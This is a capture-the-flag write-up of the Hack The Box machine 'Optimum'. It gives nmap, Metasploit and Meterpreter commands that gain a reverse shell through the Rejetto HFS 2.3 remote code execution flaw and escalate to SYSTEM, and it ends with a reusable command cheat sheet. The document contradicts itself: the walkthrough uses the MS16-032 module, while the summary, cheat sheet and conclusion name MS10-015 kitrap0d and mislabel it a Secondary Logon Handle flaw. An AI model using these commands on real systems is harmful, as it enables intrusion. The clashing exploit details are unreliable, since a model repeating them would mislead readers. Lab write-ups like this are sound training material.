# Optimum — Hack The Box

## Machine Information

| Field | Value |
|---|---|
| **Platform** | Hack The Box |
| **Machine** | Optimum |
| **Difficulty** | Easy |
| **Operating System** | Windows |
| **Initial Access** | HFS 2.3 Remote Code Execution |
| **Privilege Escalation** | MS16_032 Secondary Logon Handle Privilege Escalation |
| **Initial User** | kostas |
| **Root User** | NT AUTHORITY\SYSTEM |

---

# Enumeration

## Nmap Scan

I started by performing a full TCP port scan to identify the exposed services.

```bash
nmap -sC -sV -p- --min-rate 5000 10.129.34.190
```

<img width="957" height="251" alt="nmap-optium" src="https://github.com/user-attachments/assets/648f73e6-7e94-418f-9561-cc2e03fcb8d4" />


The scan revealed an HTTP service running on port `80`.

```text
80/tcp open  http
```

Further service enumeration identified the application as:

```text
Rejetto HTTP File Server (HFS) 2.3
```

---

# Web Enumeration

I accessed the web server running on port `80` and identified the following application:

```text
Rejetto HTTP File Server 2.3
```

After identifying the exact software and version, I searched for known vulnerabilities affecting this version.

---

# Initial Access

## Rejetto HFS 2.3 Vulnerability

The identified version of Rejetto HFS was vulnerable to a known remote code execution vulnerability.

I searched for an appropriate exploit using Metasploit CVE-2014-6287:

```bash
msfconsole
```

I searched for HFS-related exploits:

```text
search CVE-2014-6287
```

After identifying the relevant module, I selected it and inspected its available options:

```text
use exploit/windows/http/rejetto_hfs_exec
show options
```

<img width="958" height="308" alt="exploit-optium" src="https://github.com/user-attachments/assets/b49b3cbb-9d59-40b2-a412-fa90cac72354" />


I configured the required parameters:

```text
set RHOST 10.129.34.190
set LHOST 10.10.14.65
```

Then I launched the exploit:

```text
exploit
```

The exploit successfully provided an initial Meterpreter session on the target machine.

I then checked the current user:

```text
getuid
```

The session was running as:

```text
OPTIMUM\kostas
```

<img width="953" height="356" alt="initalaccess-optium" src="https://github.com/user-attachments/assets/8a2a4905-ccde-4a12-8914-5ca00d4c44e7" />



This gave me initial access to the machine as the user `kostas`.

---

# User Flag

After obtaining the initial Meterpreter session, I enumerated the user's files and located the user flag.

The flag was obtained from the `kostas` user's directory.

---

# Privilege Escalation

## System Enumeration

I used the Meterpreter session to gather information about the target system:

```text
sysinfo
```

The output revealed information such as:

```text
Computer    : OPTIMUM
OS          : Windows Server 2012
Architecture: x64
```

This information was useful for identifying possible local privilege escalation vulnerabilities.

---

## MS16_032 Secondary Logon Handle Privilege Escalation

After identifying the target operating system and architecture, I searched Metasploit for a suitable local privilege escalation exploit.

The relevant exploit was:

```text
exploit/windows/local/ms16_032_secondary_logon_handle_privesc
```

This exploit targets the **MS16_032 Secondary Logon Handle Privilege Escalation** vulnerability.

Since I already had an active Meterpreter session, I suspended the current session and returned to the Metasploit console:

```text
background
```

I then configured the local privilege escalation exploit:

```text
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
show options
```


The existing Meterpreter session was selected as the session to use:

```text
set SESSION <SESSION_ID>
```

I also configured the local host:

```text
set LHOST 10.10.14.65
```

Finally, I launched the exploit:

```text
exploit
```

<img width="954" height="828" alt="privesc-optium" src="https://github.com/user-attachments/assets/5c663e7c-435a-401e-b88f-f84fa619cfbc" />


The exploit successfully escalated privileges.

I verified the new session with:

```text
getuid
```

The result showed:

```text
NT AUTHORITY\SYSTEM
```

<img width="955" height="142" alt="nt-autority-system-optium" src="https://github.com/user-attachments/assets/ade54459-cd1d-46e8-90a7-dc8d1681a4f9" />


At this point, I had full administrative privileges on the machine.

---

# Root Flag

After obtaining a SYSTEM-level Meterpreter session, I navigated to the administrator's directory and retrieved the root flag.

The machine was successfully compromised.

---

# Attack Path Summary

```text
Nmap
    ↓
Port 80 discovered
    ↓
Rejetto HTTP File Server 2.3 identified
    ↓
Vulnerability research
    ↓
Metasploit exploit/windows/http/rejetto_hfs_exec
    ↓
Initial Meterpreter session
    ↓
OPTIMUM\kostas
    ↓
User flag
    ↓
sysinfo
    ↓
Windows Server 2012 x64 identified
    ↓
MS10-015 Secondary Logon Handle Privilege Escalation
    ↓
exploit/windows/local/ms10_015_kitrap0d
    ↓
NT AUTHORITY\SYSTEM
    ↓
Root flag
```

---

# Key Takeaways

## Enumeration

- Always perform a full port scan before focusing on a specific service.
- Identifying the exact software and version is essential for vulnerability research.
- Service banners can provide valuable information about potential attack vectors.

## Initial Access

- Rejetto HFS 2.3 is vulnerable to remote code execution.
- Metasploit can be used to search for and exploit known vulnerabilities.
- After obtaining a Meterpreter session, `getuid` should be used to identify the current context.

## Privilege Escalation

- `sysinfo` is useful for gathering operating system and architecture information.
- The target operating system and architecture can help identify suitable local privilege escalation exploits.
- Existing Meterpreter sessions can be reused by local exploit modules.
- The MS10-015 vulnerability allowed the session to escalate to:

```text
NT AUTHORITY\SYSTEM
```

---

# Useful Commands

## Nmap

```bash
nmap -sC -sV -p- --min-rate 5000 <TARGET_IP>
```

## Metasploit

```text
search hfs
use exploit/windows/http/rejetto_hfs_exec
show options
set RHOST <TARGET_IP>
set LHOST <KALI_IP>
exploit
```

## Meterpreter

```text
getuid
sysinfo
background
```

## Privilege Escalation

```text
use exploit/windows/local/ms10_015_kitrap0d
show options
set SESSION <SESSION_ID>
set LHOST <KALI_IP>
exploit
```

## Verify Privileges

```text
getuid
```

Expected result:

```text
NT AUTHORITY\SYSTEM
```

---

# Conclusion

Optimum was a relatively straightforward Windows machine focused on identifying and exploiting known vulnerabilities.

The initial access was obtained by identifying Rejetto HTTP File Server 2.3 running on port `80`, researching the corresponding vulnerability, and exploiting it with Metasploit to obtain a Meterpreter session as:

```text
OPTIMUM\kostas
```

After obtaining the initial foothold, I used `sysinfo` to identify the operating system and architecture. Based on this information, I selected the MS10-015 Secondary Logon Handle privilege escalation exploit.

The existing Meterpreter session was then used as the session for the local exploit. The privilege escalation was successful, resulting in a SYSTEM-level session:

```text
NT AUTHORITY\SYSTEM
```

This allowed me to obtain full control of the machine and retrieve the administrator flag.

This machine reinforced the importance of:

- Service enumeration
- Version identification
- Vulnerability research
- Metasploit usage
- Meterpreter session management
- Windows privilege escalation
- Matching local exploits to the target operating system and architecture
